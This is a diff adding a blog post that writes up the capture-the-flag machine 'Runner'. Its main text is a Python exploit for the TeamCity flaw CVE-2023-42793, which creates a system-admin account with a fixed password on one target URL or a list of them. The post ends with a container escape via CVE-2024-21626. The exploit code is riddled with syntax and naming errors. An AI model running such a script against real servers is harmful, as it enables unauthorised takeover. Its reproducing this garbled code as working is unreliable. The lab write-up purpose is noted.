@@ -1,0 +1,246 @@
+---
+layout: post
+title: "Runner 4b1da7b22392418faa02ce4ffe8868f1"
+date:   2025-07-11 12:05:57 -0400
+categories: writeups
+---
+
+# Runner
+
+# 1. Enumeration
+
+We use nmap to make port recognition
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled.png' | relative_url }})
+
+A http and ssh ports open, let’s see what’s going on.
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_1.png' | relative_url }})
+
+After a long seeking, trying to find directories or subdomains due to the web application doesn’t have any input item, we created a custom dictionary to fuzzing.
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_2.png' | relative_url }})
+
+Then, we use go buster and add domains with the corresponding flag
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_3.png' | relative_url }})
+
+A subdomain with a log in interface
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_4.png' | relative_url }})
+
+# 2. User flag
+
+A research was necessary to find a vulnerability in this version.
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_5.png' | relative_url }})
+
+How ir works:
+
+1. Token Deletion: The script initiates a DELETE request to remove the user token associated the default user.
+2. Token Creation: Upon successful token deletion, a new user token is created for the same default user.
+3. User creation: Using the newly generated token, the script then creates a new user with administrative privileges.
+4. Output: Successful exploit are reported, and the compromised URLs are appended to a file `vulnerable.txt`
+
+```python
+#To generate ramdon names
+import random
+#To send http requests
+import requests
+#To analyze arguments 
+import argparse
+#To process xml responses
+import xml.etree.Element ar ET
+
+#Define color 
+Color_Off="\033[0m"
+Black = "\033[0;30m"
+Red= "\033[0;31m"
+Green= "\033[0;32m"
+Yellow= "\033[0;33m"
+Blue= "\033[0;34m"
+Purple= "\033[0;35m"
+
+class CVE_2023_42793:
+	#Create the constructor
+	def __init__(self):
+		#Url 
+		self.url=""
+		#Http request session
+		self.session = request.session()
+		
+	def username(self):
+		name = "H454NSec"
+		random_id = random.randint(1000,9999)
+		return f"{name}{random_id}
+	
+	def delete_user_token(self, url)
+		self.url = url
+		headers = {
+			"User-Agent":"Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0",
+			"Content-Type":"application/x-www-form-urlencoded",
+			"Accept-Encoding":"gzip, deflate"
+			}
+		try:
+			#Send a request to delete the user token
+			response = self.session.delete(f"{self.url}/app/rest/users/id:1/tokens/RPC2", headers=headers, timeout=10)
+			#If the answer is successful
+			if response.status_code == 204 or response.status_code == 404:
+				self.create_user_token()
+			
+		except Exception as err:
+			pass
+			
+	def create_user_token(self):
+		headers = {
+			"User-Agent":"Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0",
+			"Accept-Encoding":"gzip, deflate"
+		}
+		try:
+			#send a post request to create a new token
+			response = self.session.post(f"{self.url}/app/rest/users/id:1/tokens/RPC2")
+			#If the answer is successful extract token value
+			#And create a new user
+			if response.status_code == 200:
+				response_text = response.text
+				root = ET.fromstring(response_text)
+				value = root.get('value')
+				#RFC 751 open standar
+				if value.startswith('eyJ0eXAiOiAiVENWMiJ9'):
+					self.create_user(value)
+		except Exception as err:
+			pass
+			
+	def create_user(self, token):
+		uname = self.username()
+		headers = {
+		"User-Agent": "Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0",
+     "Accept": "*/*",
+     "Authorization": f"Bearer {token}",
+     "Content-Type": "application/json",
+		}
+		creds = {
+			"email": "",
+			"username": uname,
+			"password": "@H454NSec",
+			"roles": {
+				"role": [{"roleId": "SYSTEM_ADMIN",
+				"scope": "g"}]
+			}
+		}
+		try:
+			#Senfd a post request
+			response = self.session.post(f"{self.url}/app/rest/users", headers=headers, json=creds, timeout=10)
+			#if the response is successful
+			if response.status_code == 200:
+				print(f"{Green}[+] {Yellow}{self.url}/login.html {Green}[{uname}:@H454NSec]{Color_Off}")
+				with open(vul.txt,"a") as o:
+					o.write(f"[{uname}:@H454NSec] {self.url}\n")
+		except Exception as err:
+			pass
+	#if the script is execute independiently
+if __name__ == '__main__':
+	#Create an object to analize arguments on 
+	#command line
+	parser = argparse.ArgumentParser()
+	parser.add_argument('-u', '--url', help='Url of the web app')
+	parser.add_argument('-l', '--list', help='List of urls')
+	#Analyze arguments
+	args = parser.parse_args()
+	
+	#Array to save list of url's
+	db = []
+	url_list = args.list
+	
+	if url_list:
+		try:
+			with open(url_list, "r") as fr:
+			#Read every line on the file
+				for data in fr.readlines():
+					#Delete blank spaces
+					db.append(data.strip())
+		except Exception as err:
+			print(err)
+	
+	elif args.url:
+		db.append(args.url)
+	#Instantiate an object to use it
+	cve = CVE_2023_42793()
+	for ip in db:
+		#Delete the last slash if it is present
+		url = ip[:-1] if ip.endswitch("/") else ip
+		#Add http is it is not present
+		if not url.startswitch("http://"):
+			if not url.startswitch("http://"):
+				url = f"http://{url}"
+		cve.delete_user_token(url)
+```
+
+		
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_6.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_7.png' | relative_url }})
+
+We can create new projects here, this input is no sanitized but needs some files to recognize it as a repository
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_8.png' | relative_url }})
+
+There are some users which can be useful to enumerate users
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_9.png' | relative_url }})
+
+Beautiful thing happens on backup section, where we can download the .zip associated to the backup
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_10.png' | relative_url }})
+
+There we realize that there are some credentials, with a cryptographic algorithm defined in a column 
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_11.png' | relative_url }})
+
+We crack Andrew password, it was possible due to Andrew has a insecure password
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_12.png' | relative_url }})
+
+We could think that password will be helpful to move forward which is right but first we need get into ssh but those credentials were no useful, so we dig a little more inside and we could find a private key
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_13.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_14.png' | relative_url }})
+
+3.Priv esc
+
+We actually don’t have credentials so sudo -l is no possible to execute it, but we can use linpeas to enumerate the whole system.
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_15.png' | relative_url }})
+
+We can see a service running locally with the localport. We proceed to port forwarding using chisel
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_16.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_17.png' | relative_url }})
+
+Again there is a log in interface, this time we tried with Andrew credentials.
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_18.png' | relative_url }})
+
+The services allows to create containers and manage them
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_19.png' | relative_url }})
+
+This version has a vulnerability which we can exploit it through container creation process
+
+- CVE-2024-21626
+    
+    runc is a CLI(command line interface) tool for spawning and running containers on Linux according to the OCI(Open Container Initiative). In runc 1.1.11 and earlier, due to an internal file descriptor (Resources which are used access files) leak, an attacker could cause a newly-spawned container process (from runc exec) to have a working directory in the host filesystem namespace, allowing for a container escape by giving access to the host filesystem. The same attack could be used by a malicious image to allow a container process to gain access to the host filesystem through runc. Variants of these attacks could be also be used to overwrite semi-arbitrary host binaries, allowing for complete container escapes.
+    
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_20.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_21.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_22.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_23.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_24.png' | relative_url }})
